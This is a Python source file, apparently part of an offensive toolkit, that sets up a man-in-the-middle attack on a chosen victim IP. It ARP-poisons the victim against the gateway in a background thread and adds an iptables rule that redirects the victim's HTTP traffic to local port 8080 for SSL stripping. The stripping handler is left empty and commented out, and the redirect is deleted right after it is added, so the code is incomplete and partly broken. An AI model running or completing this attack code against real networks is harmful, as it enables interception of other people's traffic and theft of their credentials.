from arp_poison import ArpPoisoner
from scapy.all import *
import threading
import time
import os
from utils import get_gateway_ip, network_utils

def run(args):
    interface = args.interface
    victim_ip = args.victim_ip

    # Spoof the gateway router
    gateway_ip = get_gateway_ip.find_gateway_ip()
    args.gateway_ip = gateway_ip
    args.gateway_mac = network_utils.get_mac_address(gateway_ip, interface=args.interface)
    stop_event = threading.Event()

    # Redirect HTTP packets from victim to local port 8080
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")

    #def ssl_strip_packet(packet):
        

    try:
        poisoner = ArpPoisoner(args)
        arp_poison_thread = threading.Thread(target=poisoner.start)
        arp_poison_thread.setDaemon(True)
        arp_poison_thread.start()

        print("[+] Started sniffing TCP on Port 8080...")
        #sniff(filter="tcp port 8080", store = False, prn=ssl_strip_packet, iface=interface)

        #Stop redirecting HTTP packets from victim
        os.system("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")

        print("[-] Stopping sniffing... (Ctrl+C again to stop the ARP Poisoning too.)")

        while not stop_event.is_set():
            time.sleep(0.5)

    except (KeyboardInterrupt, SystemExit):
        print("[-] Interrupted, joining threads...")
        stop_event.set()
        poisoner.stop()
        arp_poison_thread.join()

